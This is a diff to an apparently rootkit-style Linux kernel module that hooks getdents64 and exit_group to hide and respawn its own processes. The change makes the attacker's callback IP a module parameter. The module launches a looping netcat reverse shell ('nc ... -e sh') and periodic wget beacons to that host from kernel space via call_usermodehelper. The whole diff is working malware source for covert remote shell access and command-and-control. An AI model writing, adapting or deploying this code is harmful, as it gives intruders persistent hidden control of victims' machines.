@@ -14,6 +14,9 @@ MODULE_LICENSE("GPL");
 MODULE_AUTHOR("tibo.wav");
 MODULE_DESCRIPTION("Hook __x64_sys_getdents64 and __x64_sys_exit_group to kill our processes and respawn them");
 
+static char ip_param[KSYM_NAME_LEN] = "127.0.0.1";
+module_param_string(ip, ip_param, KSYM_NAME_LEN, 0644);
+
 /* static struct kprobe kp; */
 static struct kprobe kp2;
 static struct kprobe kp3;
@@ -101,23 +104,35 @@ static int handler_pre2(struct kprobe *p, struct pt_regs *regs) {
 
 // initiate rev shell
 static void rev_shell(void) {
-	char *shell = "while true; do nc 192.168.1.37 8001 -e sh; sleep 30; done";
+	//char *shell = "while true; do nc 192.168.1.37 8001 -e sh; sleep 30; done";
+	char *shell;
+	int size = strlen("while true; do nc ") + strlen(ip_param) + strlen(" 8001 -e sh; sleep 30; done") + 1;
+	shell = kmalloc(size, GFP_KERNEL);
+	snprintf(shell, size, "while true; do nc %s 8001 -e sh; sleep 30; done", ip_param);
 	char *argv[] = {"/bin/sh", "-c", shell, NULL};
 	call_usermodehelper(argv[0], argv, NULL, UMH_WAIT_EXEC);
 }
 
 //function to make a request every 30s
 static void make_request_periodic(void) {
-	char *str = "while true; do wget http://192.168.1.37:8000/UP; sleep 30; done";
+	//char *str = "while true; do wget http://192.168.1.37:8000/UP; sleep 30; done";
+	char *str;
+	int size = strlen("while true; do wget http://") + strlen(ip_param) + strlen(":8000/UP; sleep 30; done") + 1;
+	str = kmalloc(size, GFP_KERNEL);
+	snprintf(str, size, "while true; do wget http://%s:8000/UP; sleep 30; done", ip_param);
 	char *argv[] = {"/bin/sh", "-c", str, NULL};
 	call_usermodehelper(argv[0], argv, NULL, UMH_WAIT_EXEC);
 }
 
 // function to make requests with a specified string
 static void make_request(char *str) {
-	char *command = kmalloc(strlen(str) + strlen("http://192.168.1.37:8000/") + 1, GFP_KERNEL);
-	strcpy(command, "http://192.168.1.37:8000/");
-	strcat(command, str);
+	//char *command = kmalloc(strlen(str) + strlen("http://192.168.1.37:8000/") + 1, GFP_KERNEL);
+	//strcpy(command, "http://192.168.1.37:8000/");
+	//strcat(command, str);
+	char *command;
+	int size = strlen("http://") + strlen(ip_param) + strlen(":8000/") + strlen(str) + 1;
+	command = kmalloc(size, GFP_KERNEL);
+	snprintf(command, size, "http://%s:8000/%s", ip_param, str);
 	char *argv[] = {"/usr/bin/wget", command, NULL};
 	call_usermodehelper(argv[0], argv, NULL, UMH_WAIT_EXEC);
 	kfree(command);
